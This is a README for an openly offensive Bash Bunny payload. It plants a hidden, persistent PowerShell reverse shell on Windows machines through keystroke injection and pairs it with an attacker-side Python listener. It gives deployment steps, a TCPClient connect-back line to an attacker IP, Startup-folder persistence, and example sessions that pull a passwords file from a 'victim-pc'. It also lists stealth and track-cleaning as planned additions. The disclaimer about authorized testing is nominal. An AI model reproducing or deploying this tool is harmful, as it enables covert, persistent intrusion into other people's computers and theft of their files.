# Persistent Reverse Shell with Terminal UI Listener

**Author:** CyberJulian  
**Category:** Network  
**Target OS:** Windows 10, 11  
**Attack Modes:** HID, STORAGE 

---

## ⚠️ Disclaimer  
This project is intended for **educational and authorized testing purposes only**. Unauthorized use of this software is strictly prohibited.

---

## Overview  
This **Bash Bunny payload** deploys a **persistent reverse shell** on a Windows target, enabling remote access via a feature-rich terminal interface. The script runs on system startup, ensuring continuous reconnection even after reboots.

## Features  
✅ **Persistent Connection** – Automatically reconnects on system startup.  
✅ **Stealthy Execution** – Runs in the background from a hidden directory.  
✅ **Command Execution** – Executes shell commands remotely and returns output.  
✅ **File Download** – Transfer files from the target system to the attacker machine.  
✅ **Interactive Terminal UI** – Enhanced console interface with status tracking.  
✅ **Paged Output** – Easily navigate through large command outputs.  
✅ **Automatic Deployment** – Installs via Bash Bunny keystroke injection.  

---

## How It Works

### **1️⃣ Execution via Bash Bunny**  
- The Bash Bunny injects keystrokes to **run a PowerShell command** that:  
  - Copies the reverse shell script to a **hidden directory** (`%APPDATA%\HiddenFolder`).  
  - Creates a **batch script** in the Windows **Startup folder** for persistence.  

### **2️⃣ Persistent Connection Attempt**  
- The reverse shell script **loops continuously**, trying to connect to the **designated listener IP and port**.  
- If the connection is lost, the script **retries every 5 seconds** until successful.  
- If the system reboots, the **Startup script automatically restarts the process**.

### **3️⃣ Remote Command Execution**  
- Once connected, the target device **listens for commands** from the remote listener.
- The session remains active until manually terminated.
  - To **fully terminate the script**, type "exit". This will **completely stop execution** and close the connection.
   - You'd have to wait for the computer to reboot in order to connect once more
  - To stop the connection while **keeping the script running on loop**, enter Control+C

---

## Setup Instructions

### **🔹 Listener (Attacker Machine)**
1. Start the listener on your machine:
   ```bash
   python3 listener.py
   ```
2. When prompted, enter your desired port (port 4444 is default)
3. The terminal UI will appear showing:
   - Connection status and information
   - Command history and output
   - Interactive shell prompt

### **🔹 Listener Interface Features**
- **Visual Status Tracking** – See connection status and client details at a glance
- **Command History** – View previously executed commands and their outputs
- **Paged Output** – Large command responses are displayed in easily navigable pages
- **File Downloads** – Use the `download <filepath>` command to transfer files from target to attacker
- **Executable Launcher** – Easily launch executables, batch files, and shortcuts on the target
- **Clean Exit** – Type `exit` to terminate the session (You'll have to wait for the computer to restart if you close with `exit`)
    - Use Control + C to end your connection and keep the program running on the target computer for a later connection

### **🔹 Deployment via Bash Bunny**
1. **Edit reverse.ps1** to set the correct **listener IP address**:
- Open reverse.ps1 and locate this line:
  ```
  $client = New-Object System.Net.Sockets.TCPClient("192.168.1.0", 4444)
  ```  
  - Replace 192.168.1.0 with your listener's IP address.  
  - Replace 4444 with your listener's port, if necessary. 
2. **Copy the payload files** to your Bash Bunny:
   ```
   /payloads/switch1/
   ├── payload.txt
   ├── setup_reverse_shell.ps1
   ├── reverse.ps1
   ```
3. **Insert the Bash Bunny into the target Windows machine.**
4. The payload will:
   - Copy the reverse shell script to a hidden directory.
   - Create a **Startup entry** to ensure persistence.
   - Initiate the first connection attempt.

---

## Payload Breakdown

### **`payload.txt` (Main Bash Bunny Script)**
- Configures the Bash Bunny as a **HID & Storage device**.
- Runs the **PowerShell setup script** from the Bash Bunny storage.
- Executes the **reverse shell script** from its new hidden location.

### **`setup_reverse_shell.ps1` (Persistence Setup)**
- Copies `reverse.ps1` to a hidden directory.
- Creates a **Startup script** in the Windows **Startup folder**.
- Ensures the reverse shell script runs on every system boot.

### **`reverse.ps1` (Reverse Shell Loop)**
- **Attempts to connect** to the attacker's listener IP & port.
- **Executes received commands** and returns output.
- **Loops indefinitely**, retrying if disconnected (every 5 seconds).

### **`listener.py` (Terminal UI Listener)**
- **Provides an interactive terminal interface** for the attacker.
- **Processes and displays** command outputs in a clean format.
- **Handles file transfers** from the target system.
- **Manages connection status** and provides visual feedback.

---

## Usage Examples

### **Basic Commands**
```
Shell> whoami
victim-pc\user

Shell> systeminfo | findstr OS
OS Name:                   Microsoft Windows 11 Home
OS Version:                10.0.22621 N/A Build 22621
```

### **File Downloads**
```
Shell> download C:\Users\user\Documents\passwords.txt
[+] File saved as: passwords.txt
```

### **Executing Programs**
```
Shell> cmd /c start notepad.exe
[*] Executing program: notepad.exe
[.] No output received.
```

---

### 🎯 **Future Enhancements**
- Force target device to **connect to desired network** if applicable.
- Implement **multi-platform support** (Mac & Linux).
- Add **file upload capability** to send files to the target.
- Improve **stealth** to bypass security tools & clean tracks.
- Add **encryption** for secure communication.
- Implement **session logging** to save command history.

---

## 🏆 Credits  
Created by **CyberJulian**
